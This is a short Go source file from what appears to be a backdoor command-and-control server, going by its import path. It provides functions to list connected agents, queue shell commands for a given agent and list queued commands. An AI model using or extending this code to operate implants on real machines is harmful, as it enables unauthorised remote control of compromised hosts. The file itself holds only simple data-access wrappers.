package cli

import "go-sec/backdoor/command-control/server/models"

func ListAgents() ([]models.Agent, error) {
	agents, err := models.ListAgents()

	return agents, err
}

func RunCommand(agentId, cmd string) error {
	c := models.NewCommand(agentId, cmd)
	has, err := models.ExitAgentId(agentId)
	if err != nil {
		return err
	}
	if has {
		err = c.Insert()
	}

	return err
}

func ListCommand(agentId string) ([]models.Command, error) {
	cmds, err := models.ListCommandByAgentId(agentId)
	if err != nil {
		return cmds, err
	}

	return cmds, err
}

